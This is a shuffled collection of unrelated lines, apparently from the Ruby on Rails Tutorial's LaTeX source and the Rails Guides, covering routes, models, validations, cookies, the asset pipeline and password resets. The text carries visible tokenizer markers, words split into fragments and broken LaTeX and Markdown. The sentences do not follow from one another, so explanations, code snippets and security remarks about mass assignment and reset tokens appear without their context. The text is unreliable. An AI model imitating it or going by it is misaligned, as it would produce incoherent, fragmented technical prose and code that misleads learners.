▁Then ▁the ▁ spec ▁say s ▁that ▁when ▁you ▁visit ▁the ▁Home ▁page ▁at ▁\ k ode { / static \_ pages / home }, ▁the ▁content ▁should ▁contain ▁the ▁words ▁`` Sample ▁App '' .
▁Note ▁here ▁that ▁both ▁actions ▁make ▁an ▁\ emph { ex p li c it } ▁call ▁to ▁\ k ode { render }, ▁in ▁this ▁case ▁rendering ▁a ▁view ▁called ▁\ k ode { show \_ follow }, ▁which ▁we ▁must ▁create .
▁Date ▖ new (201 0, ▁2, ▁28 )▖ advance ( months : ▁1, ▁day s : ▁1)
▁The ▁\ text tt { cookies ▖ permanent } ▁method , ▁which ▁creates ▁`` permanent '' ▁cookies ▁with ▁an ▁ expiration ▁\ text tt { 20 ▖ years ▖ from \_ now }, ▁gives ▁yet ▁another ▁example ▁of ▁this ▁practice ▁through ▁one ▁of ▁Rails ' ▁\ emph { time ▁helpers }, ▁which ▁are ▁methods ▁added ▁to ▁\ text tt { Fi x n um } ▁( the ▁base ▁class ▁for ▁ integer s ) :
▁The ▁result ▁appears ▁in ▁Figure ~\ ref { fig : home _ page _ follow _ stats } .
▁A ▁test ▁for ▁validation ▁of ▁the ▁\ k ode { email } ▁attribute ▖
▁* ▁FROM ▁" articles " ▁WHERE ▁ trashed ▁= ▁0
▁In ▁Rails , ▁the ▁principal ▁ import ance ▁of ▁instance ▁variables ▁is ▁that ▁they ▁are ▁automatically ▁available ▁in ▁the ▁views , ▁but ▁in ▁general ▁they ▁are ▁used ▁for ▁variables ▁that ▁need ▁to ▁be ▁available ▁throughout ▁a ▁Ruby ▁class .
▁The ▁opt im al ▁method ▁really ▁depend s ▁on ▁your ▁needs ; ▁if ▁you ▁expect ▁a ▁\ emph { large } ▁number ▁of ▁static ▁pages , ▁using ▁a ▁Static ▁Pages ▁controller ▁can ▁get ▁quite ▁cumbersome , ▁but ▁in ▁our ▁sample ▁app ▁we ' ll ▁only ▁need ▁a ▁few .
▁A ▁ summary ▁of ▁user / micropost ▁association ▁methods .
▁#### # ▁` build _ association ( attributes ▁= ▁{}) `
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ▁end ed ▁with ▁a ▁ stub ▁page ▁for ▁creating ▁new ▁users ▁( Section ~\ ref { sec : user _ signup }) .
▁* ▁Your ▁text ▁editor : ▁ Most ▁text ▁editor s ▁( such ▁as ▁ TextMate ), ▁default ▁to ▁saving ╼ ▁files ▁as ▁ UT F -8 ▖
▁| ▁POST ▁| ▁ / photos ▁| ▁photos # create ▁| ▁images _ path ▁|
▁* ▁L it er al s ▁like ▁` nil `, ▁` false `, ▁` true `, ▁` self ` .
▁### ▁S t and - A l one ▁Active ▁Support
▁<%= ▁link _ to ▁' M y ▁ Blog ', ▁controller : ▁' articles ' ▁%>
▁In ▁our ▁case , ▁we ▁expect ▁the ▁\ k ode { full \_ title } ▁helper ▁to ▁be ▁used ▁on ▁all ▁the ▁site ' s ▁pages , ▁and ▁Rails ▁has ▁a ▁special ▁helper ▁file ▁for ▁this ▁case : ▁\ k ode { app / helpers / application \_ helper ▖ rb } .
▁ rm ▁< file >
▁We ▁have ▁no ▁not ion ▁of ▁logging ▁in ▁or ▁out , ▁and ▁no ▁way ▁to ▁prevent ▁any ▁user ▁from ▁perform ing ▁any ▁operation .
▁calls ▁the ▁\ k ode { find \_ by } ▁method ▁the ▁first ▁time ▁\ k ode { current \_ user } ▁is ▁called , ▁but ▁on ▁subsequent ▁ invocation s ▁returns ▁\ k ode {@ current \_ user } ▁without ▁hit ting ▁the ▁database
▁╼╼ THE ▁S O F T W A RE ▁ IS ▁PR O V IDE D ▁" A S ▁ IS ", ▁ W IT H OUT ▁ W A R R A N T Y ▁O F ▁A N Y ▁ K IN D , ▁E X P RE S S ▁OR ╼ IM P L IE D , ▁ IN C L U D IN G ▁B UT ▁ NOT ▁LIMIT E D ▁T O ▁ THE ▁ W A R R A N T IE S ▁O F ▁M ER C HA N T A B I L IT Y ,╼ F IT N E S S ▁F O R ▁A ▁P A R T I C U LA R ▁P U R P OS E ▁ AND ▁N ON IN F R IN G E M E N T .
▁# ▁=> ▁< input ▁id =" token " ▁name =" token " ▁type =" hidden " ▁value =" V U B J K B 23 U I V I 1 U U 1 V O B V I @ " ▁/>
▁In ▁either ▁case , ▁when ▁you ▁finish ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁you ▁will ▁be ▁in ▁a ▁position ▁to ▁benefit ▁from ▁the ▁many ▁more ▁advanced ▁ books , ▁blog s , ▁and ▁ screencasts ▁that ▁are ▁part ▁of ▁the ▁ th ri v ing ▁programming ▁ ed u c ation al ▁e co system
▁If ▁you ▁are ▁not ▁using ▁ ST I , ▁try ▁an ▁analogous ▁keyword ▁like ▁" con text ", ▁that ▁may ▁ still ▁a cc ur ate ly ▁describe ▁the ▁data ▁you ▁are ▁ modeling .
▁And ▁here ' s ▁how ▁our ▁app ▁look s ▁so ▁far :
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ respond _ to _ password } .
▁The ▁complete ▁( but ▁not - y e t - working ) ▁\ k ode { sign \_ in } ▁function .
▁An ▁index ▁for ▁this ▁association ▁is ▁also ▁created ▁on ▁this ▁column ▖╼
▁* ▁How ▁to ▁define ▁a ▁custom ▁ Middleware ▁ stack .
▁For ▁example , ▁you ▁m ight ▁call ▁a ▁partial ▁like ▁this :
▁config ▖ autoload _ paths ▁ += ▁% W ( # { config ▖ root } / extra s )
▁<< E OS ▖ indent (2)
▁| ▁| ▁4 15 ▁| ▁: un support ed _ media _ type ▁|
▁By ▁default , ▁before ▁filter s ▁apply ▁to ▁\ emph { ever y } ▁action ▁in ▁a ▁controller , ▁so ▁here ▁we ▁restrict ▁the ▁filter ▁to ▁a c t ▁only ▁on ▁the ▁\ k ode { : edit } ▁and ▁\ k ode { : update } ▁actions ▁by ▁passing ▁the ▁appropriate ▁\ k ode { : only } ▁options ▁hash .
▁If ▁you ▁then ▁ forget ▁( or ▁pre t end ▁to ▁ forget ) ▁your ▁password , ▁you ▁can ▁reset ▁it ▁as ▁ developed ▁in ▁Section ~\ ref { sec : password _ reset } ▁( Figure ~\ ref { fig : reset _ email _ production }) .
▁### ▁ Spring
▁The ▁\ k ode { belongs \_ to } ▁relationship ▁between ▁a ▁micropost ▁and ▁its ▁ associated ▁user .
▁< th > S um m ary </ th >
▁For ▁ Apache :
▁ Sign ed ▁cookies ▁are ▁" secure " ▁in ▁that ▁they ▁are ▁verifie d ▁to ▁have ▁been ▁generated ▁by ▁your ▁app ▁and ▁are ▁t amp er - proof ▖
▁In ▁this ▁section , ▁we ' ll ▁be ▁working ▁main ly ▁in ▁the ▁\ k ode { app / controllers } ▁and ▁\ k ode { app / views } ▁directories .
▁( We ' ll ▁learn ▁more ▁about ▁the ▁ st range ▁\ k ode { ?} - \ k ode { : } ▁notation ▁in ▁Section ~\ ref { sec : remember _ me _ checkbox } ▖)
▁ months _ since
▁d ▖ end _ of _ quarter ▁# ▁=> ▁We d , ▁30 ▁Jun ▁2010
▁A ▁test ▁for ▁the ▁About ▁page ▖
▁Then ▁run ▁\ k ode { bundle ▁install } ▁as ▁usual :
▁H app ily , ▁Rails ▁has ▁some ▁facilit ies ▁to ▁help ▁you ▁re c over .
▁The ▁result ▁of ▁ submitting ▁a ▁micropost ▁with ▁an ▁image .
▁* ▁` config ▖ assets ▖ css _ compressor ` ▁defines ▁the ▁CSS ▁ compressor ▁to ▁use ▖
▁" favicon ▖ ic o ":" favicon a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 ▖ ic o "," my _ image ▖ png " :
▁( As ▁with ▁\ k ode { header }, ▁the ▁\ k ode { footer } ▁tag ▁is ▁new ▁in ▁HTML 5 ▖)
▁You ▁can ▁also ▁use ▁root ▁inside ▁ namespace s ▁and ▁scope s ▁as ▁well ▖
▁* ▁FROM ▁addresses
▁So ▁this ▁example ▁for ▁rendering ▁all ▁the ▁ products :
▁This ▁involve s ▁edit ing ▁the ▁\ k ode { micropost \_ params } ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ params _ picture } .
▁( We ' ll ▁discuss ▁inheritance ▁brief ly ▁in ▁Section ~\ ref { sec : inheritance _ hierarchies } ▁and ▁cover ▁both ▁subject s ▁in ▁more ▁detail ▁in ▁Section ~\ ref { sec : ruby _ classes } ▖)
▁This ▁step ▁is ▁optional , ▁but ▁ deploying ▁ early ▁and ▁often ▁allows ▁us ▁to ▁catch ▁any ▁deployment ▁problem s ▁ early ▁in ▁our ▁development ▁c y c le .
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁09 : 25 : 18 ▁GMT
▁<%= ▁stylesheet _ link _ tag ▁" main ", ▁" columns " ▁%>
▁* ▁If ▁` value ` ▁is ▁an ▁array ▁there ' s ▁a ▁ recursive ▁call ▁with ▁` key ` ▁as ▁`: root `, ▁and ▁` key ` ▁ singularize d ▁as ▁`: child re n ` .
▁| ▁ --- ---------------- ▁| ▁ ---------------- ▁| ▁ ---------------- ---------------- ▁|
▁To ▁see ▁ demo n str ation s ▁of ▁other ▁engines , ▁check ▁out ╼[ Devise ]( https :// github ▖ com / plat a format ec / devise ), ▁an ▁engine ▁that ▁provides ╼ authentication ▁for ▁its ▁ parent ▁applications , ▁or ╼[ For em ]( https :// github ▖ com / ra d ar / for em ), ▁an ▁engine ▁that ▁provides ▁ forum ╼ function al ity ▖
▁And ▁for ▁saved ▁and ▁non - destroy ed ▁objects , ▁how ▁can ▁we ▁retrieve ▁users ▁from ▁the ▁database ?
▁validates ▁: orders _ count , ▁presence : ▁true
▁This ▁time , ▁a lthough ▁we ' ll ▁def er ▁the ▁actual ▁pages ▁to ▁Section ~\ ref { sec : following _ and _ followers _ pages }, ▁we ' ll ▁make ▁the ▁routes ▁now , ▁as ▁seen ▁in ▁Listing ~\ ref { code : following _ followers _ action s _ routes } .
▁D eep ly - nested ▁resources ▁quickly ▁become ▁cumbersome ▖
▁d a v id ▁= ▁User ▖ find _ by ( name : ▁' David ')
▁# ▁See ▁ http :// help ▖ github ▖ com / i gnore - file s / ▁for ▁more ▁about ▁ignoring ▁files .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ signin _ test _ valid _ information } .
▁The ▁ Asset ▁Pipeline
▁ Save ▁the ▁activation ▁digest ▁to ▁the ▁database , ▁and ▁then ▁send ▁an ▁email ▁to ▁the ▁user ▁with ▁a ▁link ▁containing ▁the ▁activation ▁token ▁and ▁user ' s ▁email ▁address
▁Note ▁that ▁we ▁expect ▁to ▁redirect ▁users ▁to ▁the ▁root ▁path ▁instead ▁of ▁the ▁login ▁path ▁because ▁a ▁user ▁try ing ▁to ▁edit ▁a ▁different ▁user ▁would ▁already ▁be ▁logged ▁in .
▁If ▁enabled , ▁Active ▁Record ▁will ▁create ▁up ▁to ▁` 1 000 ` ▁prepar ed ▁statement s ▁per ▁database ▁connection ▁by ▁default ▖
▁Rails ▁uses ▁ internal ▁attributes ▁in ▁a ▁few ▁ s po t s , ▁for ▁examples ▁for ▁views :
▁Client ▖ where ( created _ at : ▁( Time ▖ now ▖ midnight ▁- ▁1▖ day )▖ .
▁ Meanwhile , ▁the ▁\ k ode { member } ▁method ▁arrange s ▁for ▁the ▁routes ▁to ▁respond ▁to ▁URLs ▁containing ▁the ▁user ▁id .
▁Verify ▁by ▁running ▁the ▁test ▁suite ▁that ▁the ▁new ▁code ▁is ▁ still ▁valid .
▁date ▁= ▁Date ▖ new (201 0, ▁6 , ▁7 )
▁Inde ed , ▁it ▁ha d ▁better ▁be ▁OK , ▁because ▁with ▁ bcrypt ' s ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / S alt _ % 28 crypt o gr a ph y % 2 9 } { s alt ed ▁hashes } ▁there ' s ▁no ▁way ▁for ▁us ▁to ▁tell ▁if ▁two ▁users ' ▁passwords ▁match .
▁* ▁The ▁` test ` ▁environment ▁is ▁used ▁when ▁running ▁automate d ▁tests .
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { patch } ▁method ▁to ▁issue ▁a ▁\ text tt { PATCH } ▁request , ▁which ▁follows ▁the ▁same ▁pattern ▁as ▁\ k ode { get }, ▁\ k ode { post }, ▁and ▁\ k ode { delete } .
▁The ▁missing ▁directory ▁and ▁file ▁are ▁back .
▁============= ================
▁ Each ▁method ▁is ▁a ▁request ▁to ▁perform ▁an ▁operation ▁on ▁the ▁resource ▖
▁The ▁trick ▁to ▁doing ▁that ▁is ▁to ▁format ▁the ╼ email ▁address ▁in ▁the ▁format ▁` " F u ll ▁Name ▁< email > " ` .
▁This ▁involve s ▁open ing ▁the ▁\ k ode { Gemfile } ▁with ▁a ▁text ▁editor .
▁This ▁request ▁would ▁make ▁user ▁17 ▁an ▁admin , ▁which ▁would ▁be ▁a ▁ potentially ▁serious ▁security ▁br each .
▁If ▁we ▁instead ▁store d ▁an ▁un hashed ▁token , ▁an ▁attacker ▁with ▁access ▁to ▁the ▁database ▁could ▁send ▁a ▁reset ▁request ▁to ▁the ▁user ' s ▁email ▁address ▁and ▁then ▁use ▁the ▁token ▁and ▁email ▁to ▁visit ▁the ▁corresponding ▁password ▁reset ▁link , ▁there by ▁gain ing ▁control ▁of ▁the ▁account .
▁In ▁fact , ▁it ▁will ▁turn ▁out ▁not ▁to ▁be ▁important ▁that ▁\ k ode { authenticate } ▁returns ▁the ▁user ▁itself ; ▁all ▁that ▁will ▁matter ▁is ▁that ▁it ▁returns ▁a ▁value ▁that ▁is ▁\ k ode { true } ▁in ▁a ▁boolean ▁context .
▁* ▁` references `
▁Client ▖ where (" orders _ count ▁> ▁10 ")▖ order (: name )▖ reverse _ order
▁NOTE : ▁Active ▁Job ' s ▁default ▁behavior ▁is ▁to ▁execute ▁job s ▁' : inline ' ▖
▁Client ▖ exists ?
▁Then ,╼ `@ article ▖ save ` ▁is ▁responsib le ▁for ▁saving ▁the ▁model ▁in ▁the ▁database ▖
▁L o w er ing ▁the ▁bar ri er
▁ ul t s ▁of ▁\ k ode { rails ▁routes } ▁to ▁\ k ode { grep }, ▁list ▁all ▁the ▁routes ▁ associated ▁with ▁the ▁Users ▁resource ▖ ▁Do ▁the ▁same ▁for ▁Sessions ▖ ▁How ▁many ▁routes ▁does ▁each ▁resource ▁have ? ▁\ emph { Hint } : ▁Re f er ▁to ▁the ▁\ href { https :// www ▖ learn en ough ▖ com / command - line - tutorial # sec - grep p ing } { section ▁on ▁ grep } ▁in ▁\ le c l ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 06 1 c 5 c ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁sessions _ controller ▁( end )╼╼ ▁\ subsection { Log in ▁form } ▁% ▁( fold )╼ ▁\ label { sec : login _ form }╼╼
▁if ▁loaded ?
▁belongs _ to ▁: customer , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁create _ table ▁: supplier s ▁do ▁| t |
▁ ╼ ▁=> ▁S at , ▁ 02 ▁Jan ▁2010 ▁0 3 : 3 9 : 14 ▁UTC ▁+00:00
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads ▁| ▁ ads # index ▁| ▁display ▁a ▁list ▁of ▁all ▁ ads ▁for ▁a ▁specific ▁ magazine ▁|
▁C an ▁you ▁follow ▁what ▁they ' re ▁testing ?
▁adapter : ▁ mysql 2
▁It ▁uses ▁the ▁same ▁syntax ▁and ▁options ▁as ▁` ActiveRecord :: Base ▖ find ` ▖ ╼╼
▁Start ▁the ▁console ▁at ▁the ▁command ▁line ▁as ▁follows :
▁COM MIT
▁### ▁In ter n al ▁ Middleware ▁ Stack
▁( The ▁benefit ▁of ▁using ▁an ▁email ▁field ▁is ▁that ▁some ▁systems ▁treat ▁it ▁different ly ▁from ▁a ▁text ▁field ; ▁for ▁example , ▁the ▁code ▁\ k ode { type =" email "} ▁will ▁cause ▁some ▁m ob ile ▁ dev ice s ▁to ▁display ▁a ▁special ▁key board ▁optimized ▁for ▁enter ing ▁email ▁addresses ▖)
▁rails ▁g ▁model ▁user ▁name : string
▁In ▁the ▁above ▁case ,╼ the ▁file ▁is ▁using ▁the ▁` require ` ▁and ▁the ▁` require _ tree ` ▁ directive s ▖
▁The ▁purpose ▁is ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁Ruby ▁on ▁Rails ▁programming ▁( and ▁web ▁development ▁in ▁general ) ▁by ▁ rap id ly ▁ generating ▁an ▁application ▁using ▁\ emph { scaffold ▁generator s } .
▁* ▁` config ▖ logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁` Logger ` ▁class ▖
▁You ▁can ▁also ▁cache ▁multiple ▁stylesheets ▁into ▁one ▁file , ▁which ▁requires ▁less ▁HTTP ▁connection s ▁and ▁can ▁better ▁be ▁ compress ed ▁by ▁g z ip ▁( le ad ing ▁to ▁faster ▁ tr an s f ers )▖
▁We ' ll ▁get ▁these ▁button s ▁working ▁soon ▁enough --- in ▁fact , ▁we ' ll ▁do ▁it ▁two ▁ways , ▁the ▁standard ▁way ▁( Section ~\ ref { sec : a _ working _ follow _ button _ the _ standard _ way }) ▁and ▁using ▁Ajax ▁( Section ~\ ref { sec : a _ working _ follow _ button _ with _ ajax }) --- but ▁first ▁we ' ll ▁finish ▁the ▁HTML ▁interface ▁by ▁making ▁the ▁following ▁and ▁followers ▁pages .
▁ ╼ ▁$ ▁rails ▁generate ▁controller ▁ FooBar s ▁ baz ▁ q u u x
▁* ▁` increment _ counter `
▁Because ▁of ▁the ▁way ▁Ruby ▁handle s ▁assignment s ▁inside ▁objects , ▁without ▁\ k ode { self } ▁the ▁assignment ▁would ▁create ▁a ▁\ emph { local } ▁variable ▁called ▁\ k ode { remember \_ token }, ▁which ▁isn ' t ▁what ▁we ▁want .
▁# ▁=> ▁" sample %5 B %5 D = 3 ▖ 4 & sample %5 B %5 D = - 45 ▖ 6 "
▁The ▁next ▁examples ▁do ▁exactly ▁the ▁same , ▁only ▁in ▁very ▁un common ▁place s :
▁Option ▁`: dependent ▁=> ▁: re strict ` ▁has ▁been ▁removed ▁from ▁` belongs _ to ` ▖
▁#### # ▁` collection _ singular _ id s `
▁As ▁seen ▁in ▁Listing ~\ ref { code : mail _ account _ activation }, ▁the ▁\ k ode { mail } ▁method ▁also ▁take s ▁a ▁\ k ode { subject } ▁key , ▁who se ▁value ▁is ▁used ▁as ▁the ▁email ' s ▁subject ▁line .
▁| ▁--------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁------------ -------- ▁|
▁You ▁can ▁also ▁specify ▁a ▁special ▁size ▁tag , ▁in ▁the ▁format ▁" { width } x { height } " :
▁The ▁ picture ▁format ▁validation .
▁By ▁the ▁way , ▁it ' s ▁worth ▁noting ▁that ▁\ k ode { rails ▁g } ▁is ▁a ▁shortcut ▁for ▁\ k ode { rails ▁generate }, ▁which ▁is ▁only ▁one ▁of ▁sever al ▁ shortcuts ▁supported ▁by ▁Rails ▁( Table ~\ ref { table : shortcuts }) .
▁* ▁Doe s ▁the ▁change ▁actually ▁work ?
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ first _ name ▁= ▁' Andy ') ▁LIMIT ▁1
▁If ▁the ▁response ▁is ▁a ▁full - b low n ▁view , ▁Rails ▁also ▁does ▁some ▁extra ▁work ▁to ▁wrap ▁the ▁view ▁in ▁a ▁layout ▁and ▁ possibl y ▁to ▁pull ▁in ▁partial ▁views ▖
▁U s u ally ▁it ▁happens ▁because ▁of ▁a ▁f un d a ment al ▁ mis understand ing ▁of ▁the ▁way ▁that ▁` render ` ▁works .
▁This ▁construction ▁more ▁close ly ▁follows ▁the ▁hash ▁notation ▁in ▁other ▁languages ▁( such ▁as ▁JavaScript ) ▁and ▁ en j o y s ▁g row ing ▁popular ity ▁in ▁the ▁Rails ▁ community .
▁ ╼ ▁$ ▁rake ▁db : rollback
▁Fin ally , ▁add ▁a ▁' Destroy ' ▁link ▁to ▁your ▁` index ` ▁action ▁template ╼ ( ` app / views / articles / index ▖ html ▖ erb ` ) ▁to ▁wrap ▁everything ▁together .
▁* ▁` config ▖ after _ initialize ` ▁take s ▁a ▁block ▁which ▁will ▁be ▁run ▁ _ after _ ▁Rails ▁has ▁ finished ▁initializ ing ▁the ▁application ▖
▁#< Client ▁id : ▁1, ▁first _ name : ▁" L u c as " ▁> ,
▁The ▁following ▁configuration ▁options ▁are ▁best ▁made ▁in ▁one ▁of ▁the ▁environment ╼ file s ▁( environment ▖ rb , ▁production ▖ rb , ▁etc ▖▖▖)
▁Of ▁course , ▁eventual ly ▁the ▁real ▁user ▁show ▁page ▁will ▁look ▁very ▁different , ▁and ▁won ' t ▁display ▁the ▁email ▁address ▁public ly .
▁Instead , ▁the ▁errors ▁will ▁pro p a g ate ▁normal ly ▁just ▁like ▁in ▁other ▁Active ╼ Record ▁callbacks .
▁* ▁` new ▖ html ▖ erb `
▁#### ▁ Chang ing ▁Co mp on ent s
▁In ▁Rails , ▁the ▁situation ▁is ▁different --- \ k ode { StaticPages Controller } ▁is ▁a ▁Ruby ▁class , ▁but ▁because ▁it ▁inherit s ▁from ▁\ k ode { Application Controller } ▁the ▁behavior ▁of ▁its ▁methods ▁is ▁specific ▁to ▁Rails : ▁when ▁visit ing ▁the ▁URL ▁ / static \_ pages / home , ▁Rails ▁look s ▁in ▁the ▁Static ▁Pages ▁controller ▁and ▁execute s ▁the ▁code ▁in ▁the ▁\ k ode { home } ▁action , ▁and ▁then ▁render s ▁the ▁\ emph { view } ▁( the ▁ V ▁in ▁ MVC ▁from ▁Section ~\ ref { sec : mvc }) ▁corresponding ▁to ▁the ▁action .
▁Read ▁about ▁\ href { http :// guides ▖ rubyonrails ▖ org / migrations ▖ html } { migrations ▁in ▁the ▁Rails ▁Guides } ▁for ▁more ▁information .
▁10 ▁types ▁of ▁people
▁P utting ▁a ▁copy ▁of ▁your ▁Git ▁repository ▁at ▁Bitbucket ▁serve s ▁two ▁purposes : ▁it ' s ▁a ▁full ▁back up ▁of ▁your ▁code ▁( including ▁the ▁full ▁ history ▁of ▁commit s ), ▁and ▁it ▁make s ▁any ▁future ▁collaborat ion ▁much ▁easier .
▁A lthough ▁there ▁are ▁many ▁web ▁browsers ▁to ▁choose ▁from , ▁the ▁ v a st ▁major ity ▁of ▁Rails ▁programmer s ▁use ▁ Firefox , ▁ Safari , ▁or ▁C h r o me ▁when ▁developing .
▁For ▁example , ▁a ▁stylesheet ╼ called ▁` app / assets / stylesheets / projects ▖ css ▖ scss ▖ erb ` ▁is ▁first ▁processed ▁as ▁ ERB ,╼ the n ▁ SCSS , ▁and ▁finally ▁served ▁as ▁CSS ▖ ▁The ▁same ▁applies ▁to ▁a ▁JavaScript ▁file ▁- ╼` app / assets / javascripts / projects ▖ js ▖ coffee ▖ erb ` ▁is ▁processed ▁as ▁ ERB , ▁then ╼ CoffeeScript , ▁and ▁served ▁as ▁JavaScript .
▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action } .
▁The ▁default ▁location s ▁are : ▁the ▁` images `, ▁` javascripts ` ▁and ▁` stylesheets `╼ d ir ec to r ies ▁under ▁the ▁` app / assets ` ▁folder , ▁but ▁these ▁subdirectories ╼ a re ▁not ▁special ▁- ▁any ▁path ▁under ▁` assets /* ` ▁will ▁be ▁search ed .
▁The ▁ Type s ▁of ▁Associations
▁class ▁ Cookie sController ▁< ▁Application Controller
▁By ▁using ▁a ▁simple ▁HTML ▁property ▁instead ▁of ▁insert ing ▁the ▁full ▁JavaScript ▁code ▁( as ▁in ▁previous ▁versions ▁of ▁Rails ), ▁Rails ~ 3 ▁follows ▁the ▁p hi lo so ph y ▁of ▁\ href { http :// r ailscasts ▖ com / episodes / 20 5 - u nobtrusive - javascript }{\ emph { u nobtrusive ▁JavaScript } } .
▁This ▁code ▁look s ▁nice r , ▁but ▁the ▁title ▁test ▁is ▁ still ▁a ▁bit ▁long .
▁The ▁ extremely ▁simple ▁ doc type ▁\ k ode { < ! D O C TYPE ▁ html > } ▁is ▁character ist ic ▁of ▁the ▁latest ▁HTML ▁standard , ▁HTML 5 .
▁A ▁model ▁may ▁find ▁that ▁option ▁useful ▁as ▁a ▁way ▁to ▁prevent ▁ mass - assignment ▁from ▁setting ▁the ▁attribute .
▁For ▁example , ▁by ▁declar ing ▁that ▁one ▁model ▁` belongs _ to ` ▁another , ▁you ▁in str u c t ▁Rails ▁to ▁maintain ▁P r im ary ▁Ke y - For e ig n ▁Ke y ▁information ▁between ▁instance s ▁of ▁the ▁two ▁models , ▁and ▁you ▁also ▁get ▁a ▁number ▁of ▁ utility ▁methods ▁added ▁to ▁your ▁model ▖
▁To ▁apply ▁the ▁changes ▁in ▁Listing ~\ ref { code : seed _ users _ activated }, ▁reset ▁the ▁database ▁to ▁re seed ▁the ▁data ▁as ▁usual :
▁Client ▖ find _ or _ create _ by ( first _ name : ▁' Andy ')
▁* ▁`: destroy ` ▁cause s ▁all ▁the ▁ associated ▁objects ▁to ▁also ▁be ▁destroyed
▁Now ▁make ▁sure ▁that ▁the ▁tests ▁pass :
▁create ▁config ▖ ru
▁in ▁Listing ~\ ref { code : failing _ validates _ name _ spec } .
▁The ▁first ▁timestamp ▁( ` [ timestamp _ 1 ]` ) ▁will ▁be ▁the ▁current ▁time , ▁and ▁the ▁second ╼ timestamp ▁( ` [ timestamp _ 2 ]` ) ▁will ▁be ▁the ▁current ▁time ▁plus ▁a ▁second ▖
▁The ▁result ing ▁ demo ▁app ▁will ▁allow ▁us ▁to ▁interact ▁with ▁it ▁through ▁its ▁URLs , ▁giv ing ▁us ▁in s ight ▁into ▁the ▁structure ▁of ▁a ▁Rails ▁application , ▁including ▁a ▁first ▁example ▁of ▁the ▁\ emph { REST ▁architecture } ▁favor ed ▁by ▁Rails .
▁[" 6 ", ▁"7" , ▁nil ]
▁#### ▁` demodulize `
▁* ▁` config ▖ action _ view ▖ prefix _ partial _ path _ with _ controller _ namespace ` ▁determine s ▁whether ▁or ▁not ▁partials ▁are ▁look ed ▁up ▁from ▁a ▁sub directory ▁in ▁templates ▁rendered ▁from ▁namespaced ▁controllers ▖
▁ Given ▁that ▁your ▁remote ▁branch ▁is ▁called ▁` my _ pull _ request `, ▁then ▁you ▁can ▁do ▁the ╼ following :
▁subject ▁i 18 n ▖ t ▁: subject
▁To ▁secure ▁the ▁site ▁properly , ▁we ▁also ▁need ▁access ▁control ▁on ▁the ▁\ k ode { destroy } ▁action , ▁so ▁our ▁tests ▁should ▁check ▁not ▁only ▁that ▁admin s ▁\ emph { can } ▁delete ▁users , ▁but ▁also ▁that ▁other ▁users ▁\ emph { can ' t } .
▁When ▁using ▁the ▁asset ▁pipeline , ▁paths ▁to ▁assets ▁must ▁be ▁re - written ▁and ╼` sass - rails ` ▁provides ▁` - url ` ▁and ▁` - path ` ▁helpers ▁( h y ph en at ed ▁in ▁Sass ,╼ underscore d ▁in ▁Ruby ) ▁for ▁the ▁following ▁asset ▁classes : ▁image , ▁f on t , ▁ video , ▁ audio ,╼ JavaScript ▁and ▁stylesheet .
▁S ince ▁we ' ll ▁be ▁using ▁this ▁sample ▁app ▁throughout ▁the ▁rest ▁of ▁the ▁book , ▁it ' s ▁a ▁good ▁idea ▁to ▁\ href { https :// github ▖ com / new } { make ▁a ▁new ▁repository ▁at ▁GitHub } ▁and ▁push ▁it ▁up :
▁It ▁does ▁so ▁by ▁sending ▁` to _ s ` ▁to ▁them :
▁< optgroup ▁ label =" A f r ic a ">
▁ puts ▁ 60 ~ p i x el s ▁of ▁p adding ▁at ▁the ▁to p ▁of ▁the ▁page .
▁A ▁mockup ▁of ▁the ▁sample ▁application ' s ▁Home ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ page _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁ Given ▁a ▁default ▁options ▁hash , ▁` with _ options ` ▁yields ▁a ▁ proxy ▁object ▁to ▁a ▁block ▖
▁ _ ▁And ▁what ▁could ▁an ▁attacker ▁do ▁with ▁a ▁false ▁redirect ion ?
▁#### ▁` tableize `
▁To ▁configure ▁our ▁application ▁to ▁use ▁cloud ▁ storage ▁in ▁production , ▁we ' ll ▁use ▁the ▁\ text tt { fo g } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : image _ uploader _ production } .
▁This ▁means ▁we ▁can ▁ still ▁undo ▁the ▁changes ▁easily ▁by ▁ having ▁Git ▁check ▁out ▁the ▁previous ▁commit ▁with ▁the ▁\ k ode { checkout } ▁command ▁( and ▁a ▁\ k ode { - f } ▁flag ▁to ▁ force ▁overwrit ing ▁the ▁current ▁changes ) :
▁This ▁change ▁ st em s ▁from ╼` ActiveSupport :: Callbacks ` ▁being ▁large ly ▁re written ▁for ▁the ▁4▖1 ▁release .
▁#### ▁` stringify _ keys ` ▁and ▁` stringify _ keys !
▁When ▁the ▁element ▁with ▁that ▁CSS ~ id ▁changes , ▁the ▁ jQuery ▁function ▁fire s ▁and ▁issues ▁the ▁\ k ode { alert } ▁method ▁if ▁the ▁file ▁is ▁too ▁big
▁ 111▖2345 ▖ to _ s (: rounded ) ▁# ▁=> ▁111▖23 5
▁For ▁example , ▁to ▁find ▁the ▁definition ▁of ▁a ▁function ▁called ▁\ k ode { foo }, ▁you ▁can ▁do ▁a ▁ global ▁search ▁for ▁`` de f ▁ foo '' .
▁We ▁can ▁model ▁a ▁user ▁ having ▁many ▁microposts ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods ▁in ▁the ▁User ▁and ▁Micropost ▁models , ▁respectively .
